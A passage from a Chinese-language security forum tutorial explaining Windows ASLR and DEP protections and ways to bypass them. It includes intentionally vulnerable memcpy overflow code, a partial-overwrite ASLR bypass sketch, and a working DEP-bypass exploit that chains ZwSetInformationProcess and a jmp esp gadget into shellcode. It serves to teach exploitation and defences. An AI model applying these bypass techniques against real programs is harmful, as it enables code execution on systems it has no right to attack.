![](https://bbs.pediy.com/upload/attach/202201/835440_TN3J3WHVYKAAJSA.jpg)

继续运行程序，可以看到在 Security Check 函数运行前，ecx 的值已经变成 0x90909090，因此此时不会触发 GS 保护。  

![](https://bbs.pediy.com/upload/attach/202201/835440_N74H75KX2NEFPV7.jpg)

继续向下运行，就会和上面一样，跳转到 ShellCode 处执行，弹出窗口。

六. ASLR 安全机制
============

1. 保护原理
-------

利用栈溢出漏洞的时候，往往都需要确定一个明确的跳转指令地址。无论是 jmp esp 等通用跳板指令还是 Ret2Libc 使用的各指令，我们都需要先确定这条指令的入口点。微软的 ASLR 技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰 shellcode 定位的一种保护机制。

与 SafeSEH 类似，ASLR 的实现也需要程序自身和操作系统的双重支持。支持 ASLR 的程序会在它的 PE 头中设置 IMAGE_DLL_CHARACTERISITICS_DYNAMIC_BASE 标识来说明其支持 ASLR，如下图所示：  

![](https://bbs.pediy.com/upload/attach/202201/835440_RBAZ23PBHK76SJC.jpg)

微软从 Visual Studio 2005 SP1 开始加入了 / dynamicbase 链接选项来帮我们完成这个任务，我们只需要在编译程序的时候启用 / dynamicbase 链接选项，编译好的程序就支持 ASLR 了。在编译器中，只需要通过项目属性页 -> 配置属性 -> 链接器 -> 高级 -> 随机基址选项来对 / dynamicbase 链接选项进行设置，如下图所示：![](https://bbs.pediy.com/upload/attach/202201/835440_D6R2CKQW4K3HQYX.jpg)

微软在系统中设置了映像随机开关，用户可以通过设置注册表中 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentSet\Control\Session Manager\Memory Management\MoveImages** 的键值来设定映像随机化的工作模式：

*   设置为 0 时映像随机化禁用
    
*   设置为 - 1 时强制对可随机化的映像进行处理，无论是否设置 IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 标识
    
*   设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理  
    

如果注册表中不存在，也可以新建一项，并根据需要进行设定，如下图所示：  

![](https://bbs.pediy.com/upload/attach/202201/835440_TVHQ9TJ9QK3AP5R.jpg)

对于启用了 ASLR 机制的模块，在系统重启以后，其模块的加载基地址会发生改变，如下图所示：  

![](https://bbs.pediy.com/upload/attach/202201/835440_QWGQ2TXSEDAFGKU.jpg)

开启 ASLR 的模块，其堆栈地址也会被随机化，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的，也就是说同一个程序任意两次运行时的堆栈基址是不同的，进而各变量在内存中的位置也就不确定。

例如，如下代码在是否启用 ASLR 的模块中的输出是不同的：

```
void test()
{
    char szStr[0x4];
    char *pHead = (char *)malloc(0x4);
 
    printf("Stack Addr:0x%X\nHeap Addr:0x%X\n", (DWORD)szStr, (DWORD)pHead);
}

```

对于启用了 ASLR 的程序，其两次的堆栈地址是不同的。

![](https://bbs.pediy.com/upload/attach/202201/835440_A8MY36S5C4WCWQA.jpg)

而如果关闭了 ASLR，则在 Win7 系统上，栈地址会相同（如果是 xp 系统，堆地址也会相同）。

![](https://bbs.pediy.com/upload/attach/202201/835440_VRTVZ4BSWYYC43T.jpg)

对于启用 ASLR 的程序，此时通过指定跳转指令地址的方式会由于系统的重启而失效。因此，需要通过将跳转地址设定为未启用 ASLR 模块中的地址才可以绕过 ASLR 保护机制。

但是一个程序中存在未启用 ASLR 的模块毕竟是少数，最好还是通过接下来介绍的利用部分覆盖进行定位内存的方式来绕过 ASLR。

2.ASLR 的绕过
----------

之所以可以使用部分覆盖的方式绕过 ASLR 是因为 ASLR 只是随机化了映像的加载基址，而没有对指令序列进行随机化。比如说我们当前程序的 0x12345678 的位置找到了一个跳板指令，那么系统重启之后这个跳板指令的地址可能会变为 0x21345678，也就是说这个地址的相对于基址的位置（后 16 位）是不变的，那么就可以通过修改后 16 位来一定程度上控制程序的运行。因此，只要在合适的位置找到了合适的跳板指令就可以绕过 ASLR。

> 如果通过 memcpy 类的函数攻击的话就可以将后 16 位的偏移改为 0x0000~0xFFFF 中的任意一个；如果是通过 strcpy 来攻击的话，因此这类函数会在复制结束后自动添加 0x00，所以此时可以控制的范围是 0x0000~0x00FF  

以下代码是通过 memcpy 函数为局部变量赋值的时候，存在栈溢出漏洞的代码：  

```
char g_szExploit[262] = { 0 };
 
void test()
{
    char szStr[256] = { 0 };
     
    memcpy(szStr, g_szExploit, 262);
}

```

首先编译程序，在调试中的 memcpy 下断点，可以看到栈变量到返回地址的偏移是 0x104。

![](https://bbs.pediy.com/upload/attach/202201/835440_Z39ZT7BM5Y2KS7Q.jpg)

由于此时是局部覆盖，因此，ShellCode 需要保存在输入数据的前面，而在执行 retn 的时候，寄存器 eax 执行的就是局部变量 szStr 的地址，因此可以通过在当前模块中找到 call / jmp eax 的指令来实现功能，用该指令的偏移地址（后 16 位）来进行返回地址的覆盖。

![](https://bbs.pediy.com/upload/attach/202201/835440_ZZ9PAHWFUF9BYR2.jpg)

可是经过调试，并没有发现模块中存在 jmp / call eax 的指令，所以就没有继续，附上半成品的利用代码。  

```
int main()
{
 
    LoadLibrary("user32.dll");               // MessageBox函数在该DLL中，需要将其导入才可以调用
 
    memcpy(g_szExploit, g_szShellCode, sizeof(g_szShellCode));    // 复制ShellCode
    memset(g_szExploit + sizeof(g_szShellCode), 0x90, 0x104 - sizeof(g_szShellCode) - 2);   // 覆盖剩余空间
    *(PSHORT)(g_szExploit + 0x104 - 2) = 0xXXXX;  // 覆盖返回地址的偏移地址
 
    test();
 
    system("pause");
    return 0;
}

```

七. DEP 安全机制
===========

1. 保护原理
-------

DEP 的主要作用是阻止数据页（如默认的堆页，各种堆栈页以及内存池页）执行代码。DEP 的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。如下图所示：  

![](https://bbs.pediy.com/upload/attach/202201/835440_4TCNQF7CG4ZXRZW.jpg)

DEP 机制需要 CPU 的支持，AMD 和 Intel 都为此作了设计，AMD 称之为 No-Execute Page-Protection(NX)，Intel 称之为 Execute Disable Bit(XD)，两者功能及工作原理在本质上是相同的。  

操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表中加入特殊的标识位 (NX/XD) 来标识是否允许在该页上执行指令。

下图是 Intel CPU 在开启 PAE 分发模式情况下的 PDE 和 PTE，可以看到此时的 PDE 和 PTE 最高位即 XD 位，当该为为 1 的时候，此时 PTE 所指向的物理页中保存的二进制数值不允许被用来当作指令执行。  

![](https://bbs.pediy.com/upload/attach/202201/835440_D96DRBU3PNHW7BE.jpg)

编译链接选项 / NXCOMPAT 是与 DEP 密切相关的程序链接选项，是在 Visual Studio 2005 及后续的版本中引入了一个链接选项，默认情况下是开启的。通过属性页 -> 配置属性 -> 链接器 -> 高级 -> 数据执行保护 (DEP) 来选择是否使用该编译选项。  

![](https://bbs.pediy.com/upload/attach/202201/835440_PSEKHHAWGHAWH84.jpg)

采用 / NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过可选头中的 DllCharacteristics 变量进行体现，当 DllCharacterstics 带有 0x100 的时候，则表示该程序采用了 / NXCOMPAT 编译，如下图所示：

![](https://bbs.pediy.com/upload/attach/202201/835440_QYGNJ6BW4XN5PT8.jpg)

当系统中开启了 DEP 保护机制，此时尽管程序成功跳转到 shellcode，也会抛出以下的异常，阻止程序的允许，导致 shellcode 运行失败

![](https://bbs.pediy.com/upload/attach/202201/835440_QTHRG5QN7EH9ZZD.jpg)

在 DEP 保护下溢出失败的根本原因是 DEP 检测到程序到程序转到非可执行页执行指令了，如果我们让程序跳到一个已经存在的系统函数中结果会是怎么样呢？已经存在的系统函数必然存在于可执行页上，所以此时 DEP 是不会拦截的，Ret2libc 攻击的原理也正是基于此的。  

由于 DEP 不允许我们直接到非可执行页执行指令，我们就需要在其他可执行的位置找到符合我们要求的指令，让这条指令来替我们工作，为了能够控制程序流程，在这条指令执行后，我们还需要一个返回指令，以便收回程序的控制权，然后继续下一步操作，整体流程如下图所示：

![](https://bbs.pediy.com/upload/attach/202201/835440_BJPFRJGHTWM6XAK.jpg)

简而言之，只要为 shellcode 中的每条指令都在代码区找到一条替代指令，就可以完成 exploit 想要的功能了。但是由于该方法难度过大，因此在此思想上，可以使用以下三种方法来达成目标：

*   通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行
    
*   通过跳转到 VirtualProcess 函数来将 shellcode 所在的内存页设置为可执行状态，然后再转入 shellcode 执行
    
*   通过跳转到 VirtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复制到这段内存中执行
    

2.ZwSetInformationProcess
-------------------------

一个进程的 DEP 标识保存在进行内核对象 KPROCESS 结构体中偏移 0x06B 的 Flags 字段上，该字段的类型为_KEXECUTE_OPTIONS，定义如下：  

```
kd> dt _KEXECUTE_OPTIONS
nt!_KEXECUTE_OPTIONS
   +0x000 ExecuteDisable   : Pos 0, 1 Bit
   +0x000 ExecuteEnable    : Pos 1, 1 Bit
   +0x000 DisableThunkEmulation : Pos 2, 1 Bit
   +0x000 Permanent        : Pos 3, 1 Bit
   +0x000 ExecuteDispatchEnable : Pos 4, 1 Bit
   +0x000 ImageDispatchEnable : Pos 5, 1 Bit
   +0x000 Spare            : Pos 6, 2 Bits

```

这些标识中前 4 个 bit 与 DEP 相关，当前进程 DEP 开启时 ExecuteDisable 位被置 1，当进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的，Permanent 被置 1 后表示这些标志不能再被修改。真正影响 DEP 状态的是前两位，所以只需要将 Flasg 设置为 0x02 就可以将 ExecuteEnable 置 1。  

想要对该位进行设置，可以使用 ZwSetInformationProcess 函数，该函数定义如下：

```
NTSTATUS 
WINAPI 
ZwSetInformationProcess(__in HANDLE ProcessHandle,
                          __in PROCESSINFOCLASS ProcessInformationClass,
                          __out PVOID ProcessInformation,
                          __in ULONG ProcessInformationLength);

```

<table border="1"><tbody><tr><td valign="top"><strong>参数</strong></td><td valign="top"><strong>含义</strong></td></tr><tr><td valign="top">ProcessHandle</td><td valign="top">进程句柄</td></tr><tr><td valign="top">ProcessInformation</td><td valign="top">进程信息类；当指定为 ProcessExecuteFlags(0x22) 的时候表示要设置进程的 DEP 属性</td></tr><tr><td valign="top">ProcessInformation</td><td valign="top">指向保存要设置属性的地址，当设置为 0x2 且第二个参数为 0x22 的时候就可以关闭 DEP</td></tr><tr><td valign="top">ProcessInformationLength</td><td valign="top">第三个参数的长度</td></tr></tbody></table>

由此不难知道，如果利用该函数关闭 DEP 属性，接下来只需要再系统中找到该函数，覆盖的返回地址设为该函数地址，设置好参数的值以及 jmp esp 的地址就可以实现绕过 DEP。由于的 exp 有 00，如果使用 strcpy 会产生截断，所以改用下面的方式来产生漏洞：  

```
char g_szExploit[100] = { 0 };
 
void test()
{
    char szStr[0x8] = { 0 };
     
    memcpy(szStr, g_szExploit, sizeof(g_szExploit));
}

```

漏洞利用代码，则如下：  

```
int main()
{
    DWORD dwFuncAddr = 0x7C92E62D;                                           // ZwSetInformationProcess函数地址
    DWORD dwRetAddr = 0x7C961EED;                                            // jmp esp地址
 
    LoadLibrary("user32.dll");                                              // MessageBox函数在该中，需要将其导入才可以调用
     
    *(PDWORD)g_szExploit = 0x2;                                               // 参数三的值
    memset(g_szExploit + 4, 'A', 0x8);
    *(PDWORD)(g_szExploit + 0xC) = dwFuncAddr;                              // 跳转到ZwSetInformationProcess函数地址
    *(PDWORD)(g_szExploit + 0x10) = dwRetAddr;                              // 覆盖返回地址(jmp esp)
    *(PDWORD)(g_szExploit + 0x14) = -1;                                     // 4个参数
    *(PDWORD)(g_szExploit + 0x18) = 0x22;
    *(PDWORD)(g_szExploit + 0x1C) = (DWORD)g_szExploit;                        
    *(PDWORD)(g_szExploit + 0x20) = 0x4;                           
    memcpy(g_szExploit + 0x24, g_szShellCode, sizeof(g_szShellCode));       // 保存ShellCode
 
    test();
 
    system("pause");
 
    return 0;
}

```

编译程序后放入调试器，运行到 memcpy 之后可以看到此时返回地址已经被覆盖成 ZwSetInformationProcess 函数地址，且随后参数也已经正确传递  

![](https://bbs.pediy.com/upload/attach/202201/835440_Z9P9VTHYFR4SBC3.jpg)

在 ZwSetProcess 函数处下断点，程序成功断下，接下来就会进入内核设置 DEP 属性

![](https://bbs.pediy.com/upload/attach/202201/835440_JGAVY9NQN8BWYUS.jpg)

当程序返回用户层的时候，进程的 DEP 已经被关闭，此时的 esp 指向的是 jmp esp 指令的地址  

![](https://bbs.pediy.com/upload/attach/202201/835440_KYZAUHNHPZHGRJB.jpg)

继续运行就会执行 jmp esp 指令，跳转到 shellcode，此时继续执行 shellcode 就会成功运行，不会触发 DEP 的机制  

![](https://bbs.pediy.com/upload/attach/202201/835440_HDWTVMX2CW9UU99.jpg)

剩下两种方法和该方法的做法一样，根据需要布置到栈空间就好。另外，如果进程中有可读可写可执行的区域，也可以将 shellcode 写入该区域，然后让程序跳转到该区域执行也可以绕过 DEP 机制。  

八. 参考资料  

==========

> *   《0day 安全：软件漏洞分析技术》
>     

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

最后于 1 天前 被 1900 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#缓冲区溢出](forum-150-1-156.htm) [#Windows](forum-150-1-160.htm)